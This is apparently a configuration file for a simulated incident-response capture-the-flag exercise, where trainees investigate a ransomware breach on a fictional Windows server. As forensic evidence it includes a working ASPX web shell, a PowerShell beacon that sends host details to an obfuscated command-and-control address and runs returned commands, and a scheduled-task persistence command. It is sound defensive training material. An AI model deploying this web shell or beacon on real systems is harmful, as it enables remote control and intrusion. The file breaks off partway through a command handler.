/* ============================================================
   CTF ARENA — Box B17: The Aftermath
   Incident Response Troubleshooting | Nexus Core
   Config: compromised Windows server, IR analysis, persistence, flags, hints, lore
   ============================================================ */

const B17Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Aftermath',
    subtitle: 'Incident Response — Nexus Core Breach',
    difficulty: 'Expert',
    accent: '#dc2626',
    storageKey: 'hexworth_ctf_b17',
    registryId: 'b17-the-aftermath',
    trackerKey: 'ctf_b17',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'access',
            name: 'Emergency Access',
            icon: '\uD83D\uDD11',
            description: 'Connect to the compromised ADMIN-NEXUS-01 via the emergency backdoor account. Assess the damage.',
            requiredFlags: [],
            mitre: ['T1078.003'],
            unlocks: ['containment'],
            locked: false
        },
        {
            id: 'containment',
            name: 'Threat Containment',
            icon: '\uD83D\uDEE1\uFE0F',
            description: 'Identify and disable active malicious processes and persistence mechanisms.',
            requiredFlags: [],
            mitre: ['T1562.001', 'T1053.005'],
            unlocks: ['forensics'],
            locked: true
        },
        {
            id: 'forensics',
            name: 'Forensic Analysis',
            icon: '\uD83D\uDD2C',
            description: 'Determine the initial access vector by analyzing logs, processes, and system artifacts.',
            requiredFlags: ['user'],
            mitre: ['T1190', 'T1505.003', 'T1059.001'],
            unlocks: ['recovery'],
            locked: true
        },
        {
            id: 'recovery',
            name: 'Key Recovery',
            icon: '\uD83D\uDCE6',
            description: 'Locate and recover the Decryption Key Fragment left by Grimlock.',
            requiredFlags: ['root'],
            mitre: ['T1005', 'T1074.001'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE (Sprint AR-12)
    // ═══════════════════════════════════════════════════════

    tutorialMode: false,

    tutorial: {
        steps: [
            {
                title: 'Assess the compromised system',
                tip: 'Check running processes with tasklist and network connections with netstat.',
                trigger: { event: 'command', match: { cmd: 'contains:tasklist' } }
            },
            {
                title: 'Identify persistence mechanisms',
                tip: 'Check scheduled tasks, registry run keys, and services for suspicious entries.',
                trigger: { event: 'command', match: { cmd: 'contains:schtasks' } }
            },
            {
                title: 'Analyze logs for the initial access vector',
                tip: 'Check IIS logs and Windows Event Logs for signs of the exploit.',
                trigger: { event: 'command', match: { cmd: 'contains:type' } }
            },
            {
                title: 'Determine the attack vector',
                tip: 'The IIS deserialization exploit CVE is the initial access vector.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Recover the decryption key fragment',
                tip: 'Check registry keys, PowerShell transcript logs, and hidden files.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'CYSA+',
        mappings: [
            { flagId: 'user', objective: '2.1', description: 'Given a scenario, analyze indicators of potentially malicious activity — Log analysis and initial access vector identification', skill: 'Log Analysis & IOC Detection' },
            { flagId: 'user', objective: '2.5', description: 'Given a scenario, analyze indicators of compromise — IIS exploitation and web shell detection', skill: 'Web Application Compromise Detection' },
            { flagId: 'root', objective: '3.2', description: 'Given an incident, apply appropriate containment, eradication, and recovery procedures', skill: 'Persistence Eradication' },
            { flagId: 'root', objective: '3.4', description: 'Given an incident, analyze digital forensic artifacts — Registry analysis and hidden data recovery', skill: 'Forensic Artifact Recovery' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Windows Server 2019 — Emergency Recovery Console',
            'Initializing hardware...',
            'Memory Test: 65536 MB OK',
            'Detecting drives... C:\\ (500GB SSD) D:\\ (2TB HDD)',
            'WARNING: System integrity compromised',
            'Emergency admin account activated',
            'Loading Windows...'
        ],
        grubEntries: [
            'Windows Server 2019 Standard',
            'Windows Server 2019 (Safe Mode)',
            'Windows Recovery Environment'
        ],
        loginUser: 'emergency_admin'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal', icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',  icon: '\uD83C\uDF10', app: 'browser' },
            { id: 'notes',    label: 'Notes',    icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',    label: 'Hints',    icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'emergency_admin',
        hostname: 'ADMIN-NEXUS-01',
        startDir: 'C:\\Users\\emergency_admin',
        welcome: 'Microsoft Windows [Version 10.0.17763.5458]\n(c) Microsoft Corporation. All rights reserved.\n\n[!] ALERT: System compromised — ransomware activity detected\n[!] ALERT: C:\\SensitiveData encrypted\n[!] Emergency admin session active\n\nType \'help\' for available commands.\n'
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED DATA
    // ═══════════════════════════════════════════════════════

    _ransomNote: `
===================================================
         YOUR FILES HAVE BEEN ENCRYPTED
              -- GRIMLOCK --
===================================================

All files in C:\\SensitiveData have been encrypted
with military-grade AES-256 encryption.

To recover your files, transfer 5 BTC to:
  bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

After payment, email proof to:
  grimlock_pays@protonmail.com

You have 72 hours. After that, the key is destroyed.

Do NOT attempt to decrypt files manually.
Do NOT contact law enforcement.
Do NOT rename encrypted files.

                              -- Grimlock
===================================================`,

    _iisLogs: `2026-01-10 08:14:22 10.10.50.77 GET /api/status - 200 0 0
2026-01-10 08:15:01 10.10.50.77 GET /api/config - 200 0 0
2026-01-10 09:22:15 203.0.113.42 POST /api/deserialize - 500 0 0
2026-01-10 09:22:18 203.0.113.42 POST /api/deserialize application/json 200 0 0
2026-01-10 09:22:19 203.0.113.42 POST /api/deserialize application/json 200 0 0
2026-01-10 09:22:22 203.0.113.42 GET /cmd.aspx cmd=whoami 200 0 0
2026-01-10 09:22:25 203.0.113.42 GET /cmd.aspx cmd=ipconfig 200 0 0
2026-01-10 09:22:30 203.0.113.42 GET /cmd.aspx cmd=net+user 200 0 0
2026-01-10 09:22:45 203.0.113.42 POST /cmd.aspx cmd=powershell+-ep+bypass+-f+C:\\ProgramData\\beacon.ps1 200 0 0
2026-01-10 09:23:00 203.0.113.42 GET /cmd.aspx cmd=schtasks+/create+/tn+grimlock_beacon+/tr+powershell+-ep+bypass+-f+C:\\ProgramData\\beacon.ps1+/sc+minute+/mo+5 200 0 0`,

    _beaconScript: `# Grimlock Beacon v2.4
# Persistence callback script
$key = [System.Convert]::FromBase64String("R3JpbWxvY2tEZWNyeXB0S2V5RnJhZ21lbnQ=")
$encoded_c2 = "aHR0cHM6Ly9ncmltbG9jay1jMi5kYXJrbmV0Lm9uaW9uL2JlYWNvbg=="
$c2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded_c2))

function Invoke-Beacon {
    try {
        $response = Invoke-WebRequest -Uri $c2 -Method POST -Body @{
            hostname = $env:COMPUTERNAME
            user = $env:USERNAME
            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        } -UseBasicParsing
        if ($response.StatusCode -eq 200) {
            $cmd = $response.Content
            if ($cmd -ne "NOP") { Invoke-Expression $cmd }
        }
    } catch { }
}

# Registry persistence backup
$regPath = "HKLM:\\SOFTWARE\\Grimlock"
if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force }
Set-ItemProperty -Path $regPath -Name "KeyFragment" -Value "{{FLAG:root}}"
Set-ItemProperty -Path $regPath -Name "Version" -Value "2.4"
Set-ItemProperty -Path $regPath -Name "InstallDate" -Value "2026-01-10"

while ($true) {
    Invoke-Beacon
    Start-Sleep -Seconds 300
}`,

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 200 },
        { id: 'root', points: 300 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 2000,
        minScore: 0,
        maxScore: 1000,
        hintPenalty: true,
        wrongFlagPenalty: -50,
        speedBonus: { threshold: 1800000, points: 200 },
        timeBonusThreshold: 3600
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start with tasklist /svc and netstat -ano to identify suspicious processes and connections. Look for processes with unusual names or listening on unexpected ports.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint2',
            text: 'Check IIS logs at C:\\inetpub\\logs\\LogFiles\\W3SVC1\\. Look for POST requests to /api/deserialize — this is a .NET deserialization attack (CVE-2025-24813).',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint3',
            text: 'The attacker created a scheduled task called "grimlock_beacon." Check schtasks /query /fo LIST /v for details. The beacon script is at C:\\ProgramData\\beacon.ps1.',
            cost: 75,
            penalty: -75
        },
        {
            id: 'hint4',
            text: 'The Decryption Key Fragment is stored in a registry key. Check HKLM\\SOFTWARE\\Grimlock\\KeyFragment using reg query. Alternatively, decode the base64 in beacon.ps1.',
            cost: 100,
            penalty: -100
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The "Nexus Core," a vital administrative server within the Confederacy\'s central network, has suffered a catastrophic breach. Ransomware has encrypted critical data, user accounts are locked out, and the attacker codenamed "Grimlock" may still be lurking. You\'ve been given emergency access. Your mission: contain the threat, determine the initial access vector, uncover persistence mechanisms, and recover the Decryption Key Fragment.',
        scenario: 'Grimlock exploited a .NET deserialization vulnerability in the IIS web application to deploy a web shell. From there, they uploaded a PowerShell beacon script, established persistence via scheduled tasks and registry keys, and deployed ransomware against C:\\SensitiveData. The attacker intentionally left fragments of the decryption key hidden in system artifacts as a taunting challenge.',
        outro: 'The Aftermath has been resolved. Through methodical incident response — process analysis, log correlation, persistence hunting, and artifact recovery — you identified Grimlock\'s full attack chain and recovered the Decryption Key Fragment. The Nexus Core can begin restoration.',
        ecer: {
            executive: 'IIS application was deployed without security review or WAF protection',
            culture: 'No incident response plan existed; emergency admin accounts were the only contingency',
            employee: 'Development team used .NET deserialization without input validation or type restrictions',
            regulatory: 'No requirement for endpoint detection and response (EDR) on critical servers'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Ransom Note Display
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://localhost/ransom.html',

        pages: {
            '/ransom.html': {
                title: 'YOUR FILES HAVE BEEN ENCRYPTED',
                html: `
                    <div style="text-align:center; padding:40px; background:#1a0000; border:2px solid #dc2626;">
                        <h1 style="color:#dc2626; font-size:1.8rem; font-family:monospace;">YOUR FILES HAVE BEEN ENCRYPTED</h1>
                        <div style="color:#dc2626; font-size:3rem; margin:20px 0;">-- GRIMLOCK --</div>
                        <div style="color:#ccc; font-size:0.85rem; text-align:left; max-width:600px; margin:0 auto; font-family:monospace; line-height:1.6;">
                            <p>All files in C:\\SensitiveData have been encrypted with military-grade AES-256 encryption.</p>
                            <p style="margin-top:15px;">To recover your files, transfer <span style="color:#fbbf24;">5 BTC</span> to:</p>
                            <p style="color:#fbbf24; font-size:0.75rem; word-break:break-all;">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
                            <p style="margin-top:15px;">You have <span style="color:#dc2626; font-weight:bold;">72 hours</span>. After that, the key is destroyed.</p>
                        </div>
                    </div>
                `
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (compromised Windows server)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        'C:\\': {
            type: 'dir',
            children: {
                'Users': {
                    type: 'dir',
                    children: {
                        'emergency_admin': {
                            type: 'dir',
                            children: {
                                'Desktop': {
                                    type: 'dir',
                                    children: {
                                        'RANSOM_NOTE.txt': {
                                            type: 'file',
                                            content: '===================================================\n         YOUR FILES HAVE BEEN ENCRYPTED\n              -- GRIMLOCK --\n===================================================\n\nAll files in C:\\SensitiveData have been encrypted\nwith military-grade AES-256 encryption.\n\nTo recover your files, transfer 5 BTC to:\n  bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n\nYou have 72 hours.\n\n                              -- Grimlock'
                                        },
                                        'notes.txt': {
                                            type: 'file',
                                            content: '=== INCIDENT RESPONSE BRIEFING ===\nTarget: ADMIN-NEXUS-01 (compromised)\nAttacker Codename: Grimlock\nIncident Type: Ransomware + suspected persistent access\n\nObjectives:\n1. Assess damage and identify active threats\n2. Contain — disable persistence mechanisms\n3. Determine initial access vector (Flag 1)\n4. Recover the Decryption Key Fragment (Flag 2)\n\nWarning: Grimlock may still have active sessions.'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'SensitiveData': {
                    type: 'dir',
                    children: {
                        'financial_records.xlsx.grimlock': {
                            type: 'file',
                            content: '[ENCRYPTED — AES-256 — Grimlock Ransomware]'
                        },
                        'personnel_database.accdb.grimlock': {
                            type: 'file',
                            content: '[ENCRYPTED — AES-256 — Grimlock Ransomware]'
                        },
                        'strategic_plans.docx.grimlock': {
                            type: 'file',
                            content: '[ENCRYPTED — AES-256 — Grimlock Ransomware]'
                        },
                        'RANSOM_NOTE.txt': {
                            type: 'file',
                            content: '===================================================\n         YOUR FILES HAVE BEEN ENCRYPTED\n              -- GRIMLOCK --\n===================================================\n\nAll files in C:\\SensitiveData have been encrypted\nwith military-grade AES-256 encryption.\n\nTransfer 5 BTC to:\n  bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n\n72 hours. Clock is ticking.\n\n                              -- Grimlock'
                        }
                    }
                },
                'ProgramData': {
                    type: 'dir',
                    children: {
                        'beacon.ps1': {
                            type: 'file',
                            content: '# Grimlock Beacon v2.4\n# Persistence callback script\n$key = [System.Convert]::FromBase64String("R3JpbWxvY2tEZWNyeXB0S2V5RnJhZ21lbnQ=")\n$encoded_c2 = "aHR0cHM6Ly9ncmltbG9jay1jMi5kYXJrbmV0Lm9uaW9uL2JlYWNvbg=="\n$c2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded_c2))\n\nfunction Invoke-Beacon {\n    try {\n        $response = Invoke-WebRequest -Uri $c2 -Method POST -Body @{\n            hostname = $env:COMPUTERNAME\n            user = $env:USERNAME\n            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")\n        } -UseBasicParsing\n        if ($response.StatusCode -eq 200) {\n            $cmd = $response.Content\n            if ($cmd -ne "NOP") { Invoke-Expression $cmd }\n        }\n    } catch { }\n}\n\n# Registry persistence backup\n$regPath = "HKLM:\\SOFTWARE\\Grimlock"\nif (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force }\nSet-ItemProperty -Path $regPath -Name "KeyFragment" -Value "{{FLAG:root}}"\nSet-ItemProperty -Path $regPath -Name "Version" -Value "2.4"\nSet-ItemProperty -Path $regPath -Name "InstallDate" -Value "2026-01-10"\n\nwhile ($true) {\n    Invoke-Beacon\n    Start-Sleep -Seconds 300\n}'
                        },
                        'grimlock_encrypt.exe': {
                            type: 'file',
                            content: '[PE32+ executable — Grimlock Ransomware v1.0 — AES-256 encryption module]'
                        }
                    }
                },
                'inetpub': {
                    type: 'dir',
                    children: {
                        'wwwroot': {
                            type: 'dir',
                            children: {
                                'cmd.aspx': {
                                    type: 'file',
                                    content: '<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<%\n    string cmd = Request.QueryString["cmd"];\n    if (!string.IsNullOrEmpty(cmd)) {\n        Process p = new Process();\n        p.StartInfo.FileName = "cmd.exe";\n        p.StartInfo.Arguments = "/c " + cmd;\n        p.StartInfo.RedirectStandardOutput = true;\n        p.StartInfo.UseShellExecute = false;\n        p.Start();\n        Response.Write(p.StandardOutput.ReadToEnd());\n    }\n%>'
                                },
                                'web.config': {
                                    type: 'file',
                                    content: '<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n  <system.web>\n    <compilation debug="true" targetFramework="4.8" />\n    <httpRuntime targetFramework="4.8" maxRequestLength="1048576" />\n    <!-- WARNING: Deserialization endpoint enabled without type filtering -->\n    <pages validateRequest="false" />\n  </system.web>\n</configuration>'
                                }
                            }
                        },
                        'logs': {
                            type: 'dir',
                            children: {
                                'LogFiles': {
                                    type: 'dir',
                                    children: {
                                        'W3SVC1': {
                                            type: 'dir',
                                            children: {
                                                'u_ex260110.log': {
                                                    type: 'file',
                                                    content: '#Software: Microsoft Internet Information Services 10.0\n#Version: 1.0\n#Date: 2026-01-10 08:00:00\n#Fields: date time c-ip cs-method cs-uri-stem cs-uri-query sc-status sc-substatus sc-win32-status\n2026-01-10 08:14:22 10.10.50.77 GET /api/status - 200 0 0\n2026-01-10 08:15:01 10.10.50.77 GET /api/config - 200 0 0\n2026-01-10 09:22:15 203.0.113.42 POST /api/deserialize - 500 0 0\n2026-01-10 09:22:18 203.0.113.42 POST /api/deserialize application/json 200 0 0\n2026-01-10 09:22:19 203.0.113.42 POST /api/deserialize application/json 200 0 0\n2026-01-10 09:22:22 203.0.113.42 GET /cmd.aspx cmd=whoami 200 0 0\n2026-01-10 09:22:25 203.0.113.42 GET /cmd.aspx cmd=ipconfig 200 0 0\n2026-01-10 09:22:30 203.0.113.42 GET /cmd.aspx cmd=net+user 200 0 0\n2026-01-10 09:22:45 203.0.113.42 POST /cmd.aspx cmd=powershell+-ep+bypass+-f+C:\\ProgramData\\beacon.ps1 200 0 0\n2026-01-10 09:23:00 203.0.113.42 GET /cmd.aspx cmd=schtasks+/create+/tn+grimlock_beacon+/tr+powershell+-ep+bypass+-f+C:\\ProgramData\\beacon.ps1+/sc+minute+/mo+5 200 0 0'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'Windows': {
                    type: 'dir',
                    children: {
                        'System32': {
                            type: 'dir',
                            children: {
                                'winevt': {
                                    type: 'dir',
                                    children: {
                                        'Logs': {
                                            type: 'dir',
                                            children: {
                                                'Security.evtx': {
                                                    type: 'file',
                                                    content: '[Binary Event Log — use wevtutil or Get-WinEvent to query]'
                                                },
                                                'System.evtx': {
                                                    type: 'file',
                                                    content: '[Binary Event Log — use wevtutil or Get-WinEvent to query]'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        },
                        'Temp': {
                            type: 'dir',
                            children: {
                                'grimlock_stage2.tmp': {
                                    type: 'file',
                                    content: '# Stage 2 loader — downloaded from C2\n# Deploys ransomware to C:\\SensitiveData\n$targets = Get-ChildItem -Path "C:\\SensitiveData" -Recurse -File\nforeach ($file in $targets) {\n    # AES-256 encrypt each file\n    # Rename with .grimlock extension\n    # Original deleted with secure wipe\n}\n# Drop ransom note\nSet-Content -Path "C:\\SensitiveData\\RANSOM_NOTE.txt" -Value $ransomNote'
                                }
                            }
                        },
                        'PowerShell': {
                            type: 'dir',
                            children: {
                                'Transcripts': {
                                    type: 'dir',
                                    children: {
                                        'transcript_20260110_092200.txt': {
                                            type: 'file',
                                            content: '**********************\nWindows PowerShell transcript start\nStart time: 20260110092200\nUsername: ADMIN-NEXUS-01\\SYSTEM\nMachine: ADMIN-NEXUS-01\n**********************\nPS C:\\inetpub\\wwwroot> whoami\nnt authority\\system\nPS C:\\inetpub\\wwwroot> ipconfig\n\nWindows IP Configuration\n\nEthernet adapter Ethernet0:\n   IPv4 Address. . . . . . . . . : 10.10.50.100\n   Subnet Mask . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . : 10.10.50.1\n\nPS C:\\inetpub\\wwwroot> net user\n\nUser accounts for \\\\ADMIN-NEXUS-01\n\n-------------------------------------------------------------------------------\nAdministrator            DefaultAccount           emergency_admin\nGuest                    WDAGUtilityAccount\nThe command completed successfully.\n\nPS C:\\inetpub\\wwwroot> schtasks /create /tn "grimlock_beacon" /tr "powershell -ep bypass -f C:\\ProgramData\\beacon.ps1" /sc minute /mo 5\nSUCCESS: The scheduled task "grimlock_beacon" has been successfully created.\n**********************\nWindows PowerShell transcript end\n**********************'
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS
    // ═══════════════════════════════════════════════════════

    commands: {
        'tasklist': function(args) {
            const hasSvc = args.includes('/svc') || args.includes('/SVC');
            let output = `
Image Name                     PID Session Name        Mem Usage
========================= ======== ================ ============`;

            if (hasSvc) {
                output += `
System Idle Process               0 Services                   8 K   N/A
System                            4 Services               1,024 K   N/A
smss.exe                        340 Services                 512 K   N/A
csrss.exe                       456 Services               4,096 K   N/A
wininit.exe                     512 Services               2,048 K   N/A
services.exe                    580 Services               8,192 K   N/A
lsass.exe                       596 Services              12,288 K   SamSs,VaultSvc
svchost.exe                     712 Services              16,384 K   DcomLaunch,PlugPlay,Power
svchost.exe                     780 Services               8,192 K   RpcEptMapper,RpcSs
w3wp.exe                       1204 Services              48,128 K   W3SVC
powershell.exe                 2748 Services              65,536 K   N/A
beacon_svc.exe                 3192 Services              24,576 K   GrimlockBeacon
grimlock_encrypt.exe           3456 Services              32,768 K   N/A
svchost.exe                    1044 Services              12,288 K   Schedule
cmd.exe                        4012 Console                4,096 K   N/A`;
            } else {
                output += `
System Idle Process               0 Services                   8 K
System                            4 Services               1,024 K
smss.exe                        340 Services                 512 K
csrss.exe                       456 Services               4,096 K
wininit.exe                     512 Services               2,048 K
services.exe                    580 Services               8,192 K
lsass.exe                       596 Services              12,288 K
svchost.exe                     712 Services              16,384 K
svchost.exe                     780 Services               8,192 K
w3wp.exe                       1204 Services              48,128 K
powershell.exe                 2748 Services              65,536 K
beacon_svc.exe                 3192 Services              24,576 K
grimlock_encrypt.exe           3456 Services              32,768 K
svchost.exe                    1044 Services              12,288 K
cmd.exe                        4012 Console                4,096 K`;
            }
            return output;
        },

        'netstat': function(args) {
            const hasAno = args.includes('-ano') || args.includes('-an');
            return `
Active Connections

  Proto  Local Address          Foreign Address        State           ${hasAno ? 'PID' : ''}
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       ${hasAno ? '1204' : ''}
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       ${hasAno ? '780' : ''}
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       ${hasAno ? '4' : ''}
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       ${hasAno ? '1044' : ''}
  TCP    10.10.50.100:80        203.0.113.42:48721     ESTABLISHED     ${hasAno ? '1204' : ''}
  TCP    10.10.50.100:49668     203.0.113.42:443       ESTABLISHED     ${hasAno ? '3192' : ''}
  TCP    10.10.50.100:49672     185.220.101.33:4444    ESTABLISHED     ${hasAno ? '2748' : ''}
  TCP    10.10.50.100:3389      10.10.50.77:52341      ESTABLISHED     ${hasAno ? '1044' : ''}`;
        },

        'schtasks': function(args) {
            if (args.includes('/query') || args.includes('/Query')) {
                if (args.includes('/tn') || args.includes('/TN')) {
                    const tnIdx = args.findIndex(a => a.toLowerCase() === '/tn');
                    const taskName = tnIdx !== -1 ? args[tnIdx + 1] : '';
                    if (taskName && taskName.toLowerCase().includes('grimlock')) {
                        return `
Folder: \\
HostName:                 ADMIN-NEXUS-01
TaskName:                 \\grimlock_beacon
Next Run Time:            1/10/2026 9:30:00 AM
Status:                   Running
Logon Mode:               Interactive/Background
Last Run Time:            1/10/2026 9:25:00 AM
Last Result:              0
Author:                   ADMIN-NEXUS-01\\SYSTEM
Task To Run:              powershell -ep bypass -f C:\\ProgramData\\beacon.ps1
Start In:                 N/A
Comment:                  N/A
Scheduled Task State:     Enabled
Run As User:              SYSTEM
Schedule Type:            One Time Only, Minute
Repeat: Every:            5 Minutes
Repeat: Until: Time:      None`;
                    }
                }
                return `
Folder: \\
TaskName                          Next Run Time          Status
================================ ====================== ===============
\\grimlock_beacon                  1/10/2026 9:30:00 AM   Running
\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan  1/10/2026 12:00:00 PM  Ready
\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start     1/11/2026 3:00:00 AM   Ready`;
            }

            if (args.includes('/delete') || args.includes('/Delete')) {
                return 'SUCCESS: The scheduled task "grimlock_beacon" was successfully deleted.';
            }

            return 'Usage: schtasks /query [/fo LIST] [/v] [/tn taskname]';
        },

        'reg': function(args) {
            if (args[0] !== 'query' && args[0] !== 'QUERY') return 'Usage: reg query <KeyName> [/v ValueName]';

            const keyPath = args[1] || '';

            if (keyPath.toLowerCase().includes('grimlock')) {
                return `
HKEY_LOCAL_MACHINE\\SOFTWARE\\Grimlock
    KeyFragment    REG_SZ    {{FLAG:root}}
    Version        REG_SZ    2.4
    InstallDate    REG_SZ    2026-01-10`;
            }

            if (keyPath.toLowerCase().includes('run')) {
                return `
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
    SecurityHealth    REG_EXPAND_SZ    %ProgramFiles%\\Windows Defender\\MSASCuiL.exe
    VMware User       REG_SZ           "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe"`;
            }

            return `ERROR: The system was unable to find the specified registry key or value.`;
        },

        'wevtutil': function(args) {
            if (args.length === 0) return 'Usage: wevtutil qe <LogName> [/c:count] [/f:text]';

            if (args.includes('Security') || args.includes('security')) {
                return `Event[0]:
  Log Name: Security
  Source: Microsoft-Windows-Security-Auditing
  Event ID: 4624
  Level: Information
  Date: 2026-01-10T09:22:10.000
  Description: An account was successfully logged on.
    Logon Type: 3 (Network)
    Account Name: SYSTEM
    Source Network Address: 203.0.113.42
    Logon Process: IIS AppPool

Event[1]:
  Log Name: Security
  Source: Microsoft-Windows-Security-Auditing
  Event ID: 4688
  Level: Information
  Date: 2026-01-10T09:22:22.000
  Description: A new process has been created.
    New Process Name: C:\\Windows\\System32\\cmd.exe
    Creator Process Name: C:\\Windows\\System32\\inetsrv\\w3wp.exe
    Process Command Line: cmd.exe /c whoami

Event[2]:
  Log Name: Security
  Source: Microsoft-Windows-Security-Auditing
  Event ID: 4698
  Level: Information
  Date: 2026-01-10T09:23:00.000
  Description: A scheduled task was created.
    Task Name: \\grimlock_beacon
    Task Content: powershell -ep bypass -f C:\\ProgramData\\beacon.ps1`;
            }

            if (args.includes('System') || args.includes('system')) {
                return `Event[0]:
  Log Name: System
  Source: Service Control Manager
  Event ID: 7045
  Level: Information
  Date: 2026-01-10T09:24:15.000
  Description: A service was installed in the system.
    Service Name: GrimlockBeacon
    Service File Name: C:\\ProgramData\\beacon_svc.exe
    Service Type: user mode service
    Service Start Type: auto start

Event[1]:
  Log Name: System
  Source: Microsoft-Windows-WMI
  Event ID: 5861
  Level: Information
  Date: 2026-01-10T09:25:00.000
  Description: WMI event subscription was modified.`;
            }

            return 'No events found matching the criteria.';
        },

        'type': function(args) {
            // Windows 'type' command — reads files
            const file = args.join(' ').replace(/"/g, '') || '';
            if (!file) return 'Usage: type <filename>';

            if (file.toLowerCase().includes('beacon.ps1')) {
                return B17Config._beaconScript;
            }
            if (file.toLowerCase().includes('ransom_note') || file.toLowerCase().includes('ransom')) {
                return B17Config._ransomNote;
            }
            if (file.toLowerCase().includes('u_ex260110') || file.toLowerCase().includes('iis') || (file.toLowerCase().includes('w3svc') && file.toLowerCase().includes('log'))) {
                return B17Config._iisLogs;
            }
            if (file.toLowerCase().includes('cmd.aspx')) {
                return '<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<% string cmd = Request.QueryString["cmd"];\n   if (!string.IsNullOrEmpty(cmd)) {\n     Process p = new Process();\n     p.StartInfo.FileName = "cmd.exe";\n     p.StartInfo.Arguments = "/c " + cmd;\n     p.StartInfo.RedirectStandardOutput = true;\n     p.StartInfo.UseShellExecute = false;\n     p.Start();\n     Response.Write(p.StandardOutput.ReadToEnd());\n   } %>';
            }
            if (file.toLowerCase().includes('web.config')) {
                return '<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n  <system.web>\n    <compilation debug="true" targetFramework="4.8" />\n    <httpRuntime targetFramework="4.8" maxRequestLength="1048576" />\n    <!-- WARNING: Deserialization endpoint enabled without type filtering -->\n    <pages validateRequest="false" />\n  </system.web>\n</configuration>';
            }
            if (file.toLowerCase().includes('transcript')) {
                return '**********************\nWindows PowerShell transcript start\nStart time: 20260110092200\nUsername: ADMIN-NEXUS-01\\SYSTEM\nMachine: ADMIN-NEXUS-01\n**********************\nPS C:\\inetpub\\wwwroot> whoami\nnt authority\\system\nPS C:\\inetpub\\wwwroot> ipconfig\nEthernet adapter Ethernet0:\n   IPv4 Address: 10.10.50.100\nPS C:\\inetpub\\wwwroot> schtasks /create /tn "grimlock_beacon" /tr "powershell -ep bypass -f C:\\ProgramData\\beacon.ps1" /sc minute /mo 5\nSUCCESS: The scheduled task "grimlock_beacon" has been successfully created.\n**********************\nWindows PowerShell transcript end\n**********************';
            }
            if (file.toLowerCase().includes('grimlock_stage2') || file.toLowerCase().includes('stage2')) {
                return '# Stage 2 loader - downloaded from C2\n# Deploys ransomware to C:\\SensitiveData\n$targets = Get-ChildItem -Path "C:\\SensitiveData" -Recurse -File\nforeach ($file in $targets) {\n    # AES-256 encrypt each file\n    # Rename with .grimlock extension\n}';
            }

            return `The system cannot find the file specified: ${file}`;
        },

        'dir': function(args) {
            const path = args.find(a => !a.startsWith('/')) || 'C:\\Users\\emergency_admin';
